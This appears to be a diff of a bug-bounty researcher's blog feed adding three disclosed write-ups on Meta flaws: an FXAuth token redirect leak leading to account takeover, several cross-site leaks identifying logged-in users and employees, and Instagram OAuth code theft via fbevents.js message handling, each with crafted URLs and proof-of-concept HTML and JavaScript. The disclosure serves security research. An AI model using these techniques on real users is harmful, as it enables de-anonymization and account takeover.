@@ -1,4 +1,412 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-15T15:04:38+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Two-click Facebook account takeover via FXAuth token and blob theft</title><link href="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" rel="alternate" type="text/html" title="Two-click Facebook account takeover via FXAuth token and blob theft" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-16T10:03:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Leaking Meta FXAuth Token leading to 2 click Account Takeover</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html" rel="alternate" type="text/html" title="Leaking Meta FXAuth Token leading to 2 click Account Takeover" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<hr />
+<p><br />
+FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.</p>
+
+<p>This write-up documents a redirect flaw in the FXAuth flow that allows the token to be exfiltrated and reused, enabling account linking and takeover in as little as two interactions.</p>
+
+<h1 id="description">Description</h1>
+<hr />
+<h3 id="the-fxauth-redirect-model">The FXAuth Redirect Model</h3>
+
+<p>The FXAuth flow endpoint for <code class="language-plaintext highlighter-rouge">meta.com</code> is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
+</code></pre></div></div>
+
+<p>This endpoint asks for user approval and redirects the browser back to the requestor website ( facebook.com/ instagram.com) with siged <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code>. It accepts multiple parameters, including <code class="language-plaintext highlighter-rouge">base_uri</code>:</p>
+
+<p>Originally, <code class="language-plaintext highlighter-rouge">base_uri</code> accepted any arbitrary domain, making token exfiltration trivial. Meta fixed this by restricting the parameter to Meta-owned domains.</p>
+
+<p>However, the fix relied on an incorrect assumption: that restricting the domain alone is sufficient if the attacker cannot directly control the redirect path.</p>
+
+<h3 id="why-the-fix-was-insufficient">Why the Fix Was Insufficient</h3>
+
+<p>While <code class="language-plaintext highlighter-rouge">base_uri</code> was restricted to Meta domains, not all Meta domains are safe.</p>
+
+<p>Legacy surfaces still exist where attackers can execute JavaScript under controlled paths. One such surface is <code class="language-plaintext highlighter-rouge">apps.facebook.com</code>.</p>
+
+<p>Developers can register applications with a namespace that becomes part of the URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/{app_namespace}
+</code></pre></div></div>
+
+<p>If the attacker owns an application (notably older ones), they regain the ability to read parameters from the URL despite not controlling the base path directly.</p>
+
+<p>This effectively reintroduces the original vulnerability under a different trust boundary.</p>
+
+<h3 id="the-exploitable-fxauth-flow">The Exploitable FXAuth Flow</h3>
+
+<p>A valid FXAuth request accepts:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">app_id</code> belonging to Facebook or Instagram</li>
+  <li><code class="language-plaintext highlighter-rouge">flow</code> such as <code class="language-plaintext highlighter-rouge">frlcomet</code> or <code class="language-plaintext highlighter-rouge">frlreauth</code></li>
+  <li><code class="language-plaintext highlighter-rouge">etoken</code> generated earlier in an Accounts Center flow</li>
+  <li><code class="language-plaintext highlighter-rouge">next</code> restricted to internal paths</li>
+  <li><code class="language-plaintext highlighter-rouge">base_uri</code> restricted to Meta-owned domains</li>
+</ul>
+
+<p>Example:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
+?app_id=2220391788200892
+<span class="err">&amp;</span>etoken=ATTACKER_ETOKEN
+<span class="err">&amp;</span>next=%2Fpersonal_info
+<span class="err">&amp;</span>flow=frlcomet
+<span class="err">&amp;</span>base_uri=https://apps.facebook.com
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">etoken</code> can be obtained by initiating a standard Accounts Center linking flow:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/?auth_flow=frl_linking&amp;background_page=%2F
+</code></pre></div></div>
+
+<h3 id="token-exfiltration">Token Exfiltration</h3>
+
+<p>When the victim opens the crafted FXAuth URL and approves the request, the browser is redirected to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/personal_info
+</code></pre></div></div>
+
+<p>The redirect includes sensitive parameters such as <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>.</p>
+
+<p>Because the attacker controls execution within their application namespace <code class="language-plaintext highlighter-rouge">personal_info</code>, both values can be trivially extracted. At this point, the attacker holds a valid FXAuth token bound to the victim account, he can finalize privileged flows without further user confirmation:</p>
+
+<p>Account linking:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/
+?auth_flow=frl_linking
+&amp;background_page=%2F
+&amp;blob=BLOB
+&amp;token=TOKEN
+</code></pre></div></div>
+
+<p>Action re-authentication bypass:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/profiles/VICTIM_PROFILE_ID/name/
+?auth_flow=reauth
+&amp;blob=BLOB
+&amp;token=TOKEN
+</code></pre></div></div>
+
+<p>These flows normally require explicit confirmation. Possession of a valid FXAuth token bypasses that requirement entirely.</p>
+
+<h1 id="impact">Impact</h1>
+<hr />
+<p><br />
+This vulnerability enables linking attacker-controlled accounts, bypassing Accounts Center confirmations, and achieving full account takeover with minimal interaction.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Jun 27, 2023 — Bug reported</p>
+
+<p>Jun 28, 2023 — Bug Acknowledged by Meta</p>
+
+<p>Jun 29, 2023 — <strong>$32,500</strong> bounty awarded by Meta</p>
+
+<p>Dec 29, 2024 Bypass repoted</p>
+
+<p>Apr 28, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>
+
+<p>Jan 15, 2026 — Bug fixed by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.]]></summary></entry><entry><title type="html">Multiple cross-site leaks disclosing Facebook users in third-party websites</title><link href="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html" rel="alternate" type="text/html" title="Multiple cross-site leaks disclosing Facebook users in third-party websites" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<hr />
+<p><br />
+This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.</p>
+
+<p>While none of these bugs directly grant account control on their own, they enable precise user identification, de-anonymization, and cross-context fingerprinting. When chained with other vulnerabilities, these primitives significantly lower the bar for targeted attacks, account takeover, and employee profiling.</p>
+
+<p>Each section below documents a distinct class of XS-Leak, grouped by affected surface and leakage primitive.</p>
+
+<h3 id="xs-leak-identifying-the-current-workplace--meta-work-user">XS-Leak: Identifying the Current Workplace / Meta Work User</h3>
+<hr />
+<p><br />
+This issue allows distinguishing the currently logged-in Workplace user by abusing response-type differences in Zoom callback endpoints.</p>
+
+<p>By loading the following endpoints in a script context:</p>
+
+<ul>
+  <li>https://work-api.workplace.com/zoom/callback/</li>
+  <li>https://work-api.facebook.com/zoom/callback/</li>
+</ul>
+
+<p>and supplying both <code class="language-plaintext highlighter-rouge">__cid</code> (community ID) and <code class="language-plaintext highlighter-rouge">__user</code> parameters, an attacker can brute-force the user ID within a known Workplace community.</p>
+
+<p>When <code class="language-plaintext highlighter-rouge">__user</code> is correct for the active session, the endpoint responds with an empty page and <code class="language-plaintext highlighter-rouge">Content-Type: text/html</code>, which can be loaded successfully via a script tag.<br />
+When incorrect, the response is <code class="language-plaintext highlighter-rouge">application/json</code>, triggering CORB and blocking script execution.</p>
+
+<p>By observing <code class="language-plaintext highlighter-rouge">onload</code> versus <code class="language-plaintext highlighter-rouge">onerror</code> events, the attacker can reliably determine whether a given user ID matches the currently logged-in Workplace user.</p>
+
+<p>This works across all major browsers for Workplace. For Facebook users, the same technique only works inside the Facebook app webview, where <code class="language-plaintext highlighter-rouge">__cid</code> is not properly validated.</p>
+
+<h3 id="xs-leak-identifying-the-active-facebook-user-or-page">XS-Leak: Identifying the Active Facebook User or Page</h3>
+<hr />
+<p><br />
+This issue abuses Facebook plugin behavior to distinguish the currently logged-in Facebook user or page.</p>
+
+<p>By embedding a Facebook plugin (such as the Like plugin) inside an iframe and supplying both <code class="language-plaintext highlighter-rouge">__a=1</code> and a candidate <code class="language-plaintext highlighter-rouge">__user</code> ID, different behavior is observed depending on whether the supplied ID matches the active session.</p>
+
+<p>If the <code class="language-plaintext highlighter-rouge">__user</code> value is correct, the iframe successfully loads and sends a postMessage to the parent window.   If incorrect, the response includes <code class="language-plaintext highlighter-rouge">X-Frame-Options: deny</code>, preventing the iframe from loading.</p>
+
+<p>This distinction allows brute-forcing the active user or page ID by observing postMessage events versus timeouts.</p>
+
+<p>This technique works for both personal profiles and pages and does not require any special permissions beyond the victim being logged into Facebook.</p>
+
+<h2 id="poc">PoC</h2>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"0"</span> <span class="na">height=</span><span class="s">"0"</span> <span class="na">id=</span><span class="s">"test"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">const</span> <span class="nx">tryUserID</span> <span class="o">=</span> <span class="p">(</span><span class="nx">USER_ID</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
+        <span class="nx">frm_id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">frm_id</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/plugins/like.php?app_id=&amp;container_width=0&amp;href=https%3A%2F%2Fysamm.com&amp;layout=button_count&amp;locale=fr_FR&amp;sdk=joey&amp;send=true&amp;show_faces=false&amp;width=450&amp;channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dcc%26is_canvas%3Dtrue%26origin%3Dhttps%253A%252F%252Fysamm.com%26relation%3Dopener&amp;__a=1&amp;__user=</span><span class="p">${</span><span class="nc">Number</span><span class="p">(</span><span class="nx">USER_ID</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span><span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nf">resolve</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+            <span class="nf">resolve</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>
+        <span class="p">},</span><span class="mi">2000</span><span class="p">)</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+<span class="nx">onhashchange</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">user_id</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="nf">tryUserID</span><span class="p">(</span><span class="nx">user_id</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nf">alert</span><span class="p">(</span><span class="nx">e</span><span class="p">)})</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h3 id="xs-leak-facebook-user-id-leakage-via-signalsiwljs">XS-Leak: Facebook User ID Leakage via signals/iwl.js</h3>
+<hr />
+<p><br />
+This issue enables direct leakage of the Facebook user ID on third-party origins.</p>
+
+<p>The endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID</code> returns a JavaScript payload intended for internal Meta Pixel testing, which includes the current Facebook user ID.</p>
+
+<p>Although the value is scoped inside a function, it can be extracted by abusing JavaScript prototype manipulation prior to loading the script.</p>
+
+<p>Unlike other XS-Leaks, this technique does not rely on brute-forcing or timing side channels and yields an exact user identifier.</p>
+
+<p>This allows full de-anonymization of Facebook users on third-party websites, enabling cross-site tracking, targeted attacks, and precise user correlation.</p>
+
+<h4 id="poc-1">PoC</h4>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;script&gt;</span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="k">default</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">e</span><span class="p">.</span><span class="nx">userID</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="nf">alert</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">userID</span><span class="p">)</span>
+<span class="p">};</span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">__esModule</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>The endpoint is only accessible when the user is logged in, making login state detection implicit as well.</p>
+
+<h3 id="xs-leak-employee-and-login-state-identification-across-meta-properties">XS-Leak: Employee and Login State Identification Across Meta Properties</h3>
+<hr />
+<p><br />
+This class of issues enables leaking multiple attributes about the current attacker website visitor, including:</p>
+
+<ul>
+  <li>Whether the user is logged into Facebook</li>
+  <li>Whether the user is logged into Workplace</li>
+  <li>Whether the user is logged into work.meta.com</li>
+  <li>Whether the user is a Meta employee</li>
+  <li>The employee’s Unix username or email prefix</li>
+</ul>
+
+<p>The attack relies on probing Meta-owned subdomains such as:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sb.facebook.com</code></li>
+  <li><code class="language-plaintext highlighter-rouge">sb.internalfb.com</code></li>
+  <li><code class="language-plaintext highlighter-rouge">my-od.facebook.com</code></li>
+  <li><code class="language-plaintext highlighter-rouge">my-od.internalfb.com</code></li>
+</ul>
+
+<p>Employee identifiers are reflected in subdomains (for example, www.username.sb.facebook.com).<br />
+By brute-forcing subdomains and observing load behavior, an attacker can identify the currently logged-in employee.</p>
+
+<p>For example:</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://www.testemployee.sb.facebook.com/random</code>
+<code class="language-plaintext highlighter-rouge">https://www.testemployee.sb.internalfb.com/random</code></p>
+
+<p>This can be combined with XS-Leak primitives (script loading, iframe behavior, or CORB differences) to confirm employee identity.</p>
+
+<p>Additionally, because the <code class="language-plaintext highlighter-rouge">/signals/iwl.js</code> endpoint only loads when logged in, it can be used as a login-state oracle and combined with other probes to build a detailed fingerprint of the user across Meta platforms.</p>
+
+<h1 id="impact">Impact</h1>
+<hr />
+<p><br />
+Collectively, these XS-Leaks enable:</p>
+
+<ul>
+  <li>Identification of logged-in Facebook, Workplace, and Meta Work users</li>
+  <li>Precise user ID de-anonymization on third-party websites</li>
+  <li>Detection of Meta employees and internal account attributes</li>
+  <li>Cross-platform fingerprinting without user interaction</li>
+</ul>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Dec 29, 2024 — Bug #1 reported</p>
+
+<p>Dec 27, 2024 — Bug #2 reported</p>
+
+<p>Dec 5, 2024 — Bug #3 reported</p>
+
+<p>Dec 29, 2024 — Bug #4 reported</p>
+
+<p>Dec 29, 2024 — Bugs Acknowledged by Meta</p>
+
+<p>May 22, 2025 — Bugs fixed by Meta</p>
+
+<p>Feb 12, 2025 — <strong>$2,400</strong> bounty awarded by Meta for Bug #1</p>
+
+<p>Feb 12, 2025 — <strong>$2,400</strong> bounty awarded by Meta for Bug #2</p>
+
+<p>Feb 12, 2025 — <strong>$3,600</strong> bounty awarded by Meta for Bug #3</p>
+
+<p>Feb 12, 2025 — Meta marked Bug #4 as informative</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.]]></summary></entry><entry><title type="html">Instagram account takeover via Meta Pixel script abuse</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html" rel="alternate" type="text/html" title="Instagram account takeover via Meta Pixel script abuse" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<hr />
+<p><br />
+Meta’s web ecosystem relies on cross-window messaging between first-party websites.
+In many cases, the only security control enforced is an origin check validating that messages originate from <code class="language-plaintext highlighter-rouge">facebook.com</code> or its subdomains.</p>
+
+<p>This write-up describes how that assumption can be abused to steal first-party OAuth codes and generate first-party Instagram access tokens, ultimately enabling Instagram and Facebook account takeovers under realistic conditions.</p>
+
+<p>The attack leverages a chain between a misconfigured Facebook endpoint and implicit trust in postMessage listeners such as in <code class="language-plaintext highlighter-rouge">fbevents.js</code>, which is widely deployed across Meta-owned and third-party websites.</p>
+
+<h1 id="description">Description</h1>
+<hr />
+<h3 id="cross-window-trust-in-meta-javascript">Cross-Window Trust in Meta JavaScript</h3>
+
+<p>Multiple Meta JavaScript modules register cross-window message listeners and trust incoming messages solely based on <code class="language-plaintext highlighter-rouge">event.origin</code> being <code class="language-plaintext highlighter-rouge">facebook.com</code> or one of its subdomains.</p>
+
+<p>One such consumer is <code class="language-plaintext highlighter-rouge">fbevents.js</code>, the Meta Pixel script embedded on millions of websites.
+When loaded in a window that has an <code class="language-plaintext highlighter-rouge">opener</code>, <code class="language-plaintext highlighter-rouge">fbevents.js</code> registers a message listener and reacts to specific message types by issuing requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>, including contextual data such as the current website’s <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code>. These values would contain sensitive artifacts such as OAuth authorization codes or stokens.</p>
+
+<h3 id="abusing-facebookcomredacted-endpoint">Abusing facebook.com/REDACTED endpoint</h3>
+
+<p>The message source in this chain is the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/REDACTED</code></p>
+
+<p>This endpoint constructs an object from user-supplied parameters and forwards it via <code class="language-plaintext highlighter-rouge">postMessage</code> to a target Facebook domain specified by the attacker.</p>
+
+<h3 id="chaining-with-fbeventsjs">Chaining with fbevents.js</h3>
+
+<p>When <code class="language-plaintext highlighter-rouge">fbevents.js</code> receives a message originating from <code class="language-plaintext highlighter-rouge">facebook.com</code> and matching specific message types, it uses the supplied <code class="language-plaintext highlighter-rouge">access_token</code> in the message to issue requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>.</p>
+
+<p>Crucially, the attacker fully controls this <code class="language-plaintext highlighter-rouge">access_token</code>. Meaning by supplying an attacker-owned Graph Explorer token, the resulting requests can later be inspected in the Graph Explorer history, where leaked values such as the victim’s OAuth code/token in the URL or <code class="language-plaintext highlighter-rouge">referrer</code> become visible.</p>
+
+<h3 id="attack-scenario">Attack Scenario</h3>
+
+<p>The following scenario targets <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which loads <code class="language-plaintext highlighter-rouge">fbevents.js</code> and hosts multiple OAuth callback endpoints for Instagram and Threads.</p>
+
+<p>An example OAuth authorization request initiated by the attacker:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/authorize/third_party?
+<span class="err">&amp;</span>app_id=200289238967899
+<span class="err">&amp;</span>redirect_uri=https://developers.facebook.com/instagram/token_generator/oauth/
+<span class="err">&amp;</span>response_type=code
+<span class="err">&amp;</span>scope=user_profile,user_media
+<span class="err">&amp;</span>state={"app_id":"200289238967899","nonce":"WRONG_NONCE","user_id":"1"}
+</code></pre></div></div>
+<p>Using an invalid nonce causes the flow to land on an error page at <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which still loads <code class="language-plaintext highlighter-rouge">fbevents.js</code>.</p>
+
+<p>Because the window has an opener, <code class="language-plaintext highlighter-rouge">fbevents.js</code> initializes its message listener.</p>
+
+<p>At this point, the attacker redirects attacker website to:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/REDACTED/?
+<span class="err">&amp;</span>graphToken=ATTACKER_EXPLORER_TOKEN
+<span class="err">&amp;</span>msg_type=FACEBOOK_IWL_BOOTSTRAP
+<span class="err">&amp;</span>pixelID=438056466377696
+<span class="err">&amp;</span>sessionStartTime=1668626372000
+</code></pre></div></div>
+
+<p>This causes <code class="language-plaintext highlighter-rouge">www.facebook.com</code> to send a crafted message to the <code class="language-plaintext highlighter-rouge">opener</code> (developers.facebook.com) window under a trusted origin. <code class="language-plaintext highlighter-rouge">fbevents.js</code> consumes the message and issues Graph API requests using the attacker-controlled token, embedding <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code> in these requests.</p>
+
+<p>By inspecting the attacker token’s history in Graph Explorer, the attacker can retrieve the Instagram OAuth authorization code and referrer data.</p>
+
+<h3 id="generating-a-first-party-instagram-access-token">Generating a First-Party Instagram Access Token</h3>
+
+<p>The stolen code can be exchanged for a first-party Instagram access token by abusing the following endpoint:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developers.facebook.com/instagram/short_lived_access_token/oauth/?
+<span class="err">&amp;</span>code=VICTIM_CODE
+<span class="err">&amp;</span>state={"app_id":"FIRST_PARTY_APP","nonce":"YOUR_NONCE","user_id":"1"}
+</code></pre></div></div>
+
+<p>This returns a first-party Instagram access token, even when the code was generated by a different application. This in itself was a critical bug however Meta refused to acknowledge it and then later fixed it in secret.</p>
+
+<h3 id="poc">PoC</h3>
+<p><strong>index.html:</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+Put your access_token in URL fragment and refresh (nothing is logged)
+<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"window.name='test';window.open('second.html' + location.hash)"</span><span class="nt">&gt;</span>Start Attack<span class="nt">&lt;/button&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p><strong>second.html</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">wait.html</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://www.instagram.com/oauth/authorize/third_party/?redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Finstagram%2Ftoken_generator%2Foauth%2F&amp;response_type=code&amp;scope=user_profile&amp;app_id=17951132926087090&amp;logger_id=02f8edcd-6353-454e-80c3-ec5c4e496bd2&amp;state={"app_id":1,"nonce":"somethingwrong"}</span><span class="dl">'</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p><strong>wait.html</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="k">try</span><span class="p">{</span>
+    <span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+    <span class="nx">opener</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">ping</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/REDACTED/?graphToken=</span><span class="p">${</span><span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">||</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">))}</span><span class="s2">&amp;msg_type=FACEBOOK_IWL_BOOTSTRAP&amp;pixelID=438056466377696&amp;sessionStartTime=1668626372000&amp;`</span><span class="p">}</span>
+    <span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span><span class="p">{}</span>
+<span class="p">},</span><span class="mi">100</span><span class="p">)</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h1 id="impact">Impact</h1>
+<hr />
+<p><br />
+This vulnerability enables theft of first-party Instagram OAuth codes, generation of first-party access tokens, Instagram account takeover.</p>
+
+<p>Because fbevents.js is widely deployed, the attack surface extends beyond Meta properties to third-party websites.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 16, 2024 — Bug reported</p>
+
+<p>Oct 16, 2024 — Bug Acknowledged by Meta</p>
+
+<p>Oct 24, 2024 — Bug fixed by Meta</p>
+
